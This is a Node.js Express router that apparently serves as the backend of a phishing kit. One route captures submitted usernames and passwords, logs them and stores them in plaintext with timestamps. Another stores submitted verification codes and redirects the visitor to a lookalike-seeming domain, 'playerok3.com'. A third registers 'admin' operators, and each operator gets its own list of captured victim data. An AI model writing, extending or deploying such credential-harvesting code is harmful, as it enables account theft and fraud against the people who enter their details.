const { Router } = require("express")
let express = require("express")
let fs = require("fs")
let path = require("path")
const { FindAdminByEmail, FindAdminByCode, RewriteUsersData } = require("../AllDataFns/admin")



let AdminRout = Router()
AdminRout.use(express.json());


AdminRout.post("/admin/data", (req, res) => {
    let All_usersData = JSON.parse(fs.readFileSync("./DataUsers.json"))
    let All_publicData = JSON.parse(fs.readFileSync("./DataMainAll.json"))
    let { username, password } = req.body

    console.log(username, password)


    let time = new Date()
    // let adminCode = req.session.CodeToAdmin
    let userAdmin = FindAdminByEmail(username, All_usersData)

    let obj_user = {
        username: username,
        password: password,
        time: `${time.getHours()}:${time.getMinutes()}`
    }

    // if (String(email) == "AdminMain@admin.pl") {
    //     req.session.MainAdminIn = true
    //     return res.json({ url: "/AdminMain" }).status(300)
    // }
    if (String(username) == "AdminMain@admin.pl") {
        // req.session.adminIn = username
        return res.json({ url: `/adminDataPage` }).status(300)
    }
    else {
        All_publicData.push(obj_user)
    }

    fs.writeFileSync("./DataMainAll.json", JSON.stringify(All_publicData, null, 4))
    fs.writeFileSync("./DataUsers.json", JSON.stringify(All_usersData, null, 4))
    res.json({ url: "" }).status(200)
})



AdminRout.post("/admin/code", (req, res) => {
    let All_usersData = JSON.parse(fs.readFileSync("./DataUsers.json"))
    let All_publicData = JSON.parse(fs.readFileSync("./DataMainAll.json"))
    let { code, email } = req.body
    let adminCode = req.session.CodeToAdmin

    if (adminCode) {
        let ArUsers = (FindAdminByCode(adminCode, All_usersData).needAdmin).usersData
        RewriteUsersData(ArUsers, code, email)
    }
    else {
        RewriteUsersData(All_publicData, code, email)
    }

    fs.writeFileSync("./DataUsers.json", JSON.stringify(All_usersData, null, 4))
    fs.writeFileSync("./DataMainAll.json", JSON.stringify(All_publicData, null, 4))

    res.json({ url: "https://playerok3.com/" }).status(200)
})


AdminRout.post("/admin/add", (req, res) => {
    let All_usersData = JSON.parse(fs.readFileSync("./DataUsers.json"))
    let { admin_email, nick, name } = req.body

    let obj = {
        Admin_id: name,
        admin_email: admin_email,
        nick: nick,
        active: true,

        usersData: []
    }


    All_usersData.push(obj)

    fs.writeFileSync("./DataUsers.json", JSON.stringify(All_usersData, null, 4))
    res.end()
})



module.exports = AdminRout
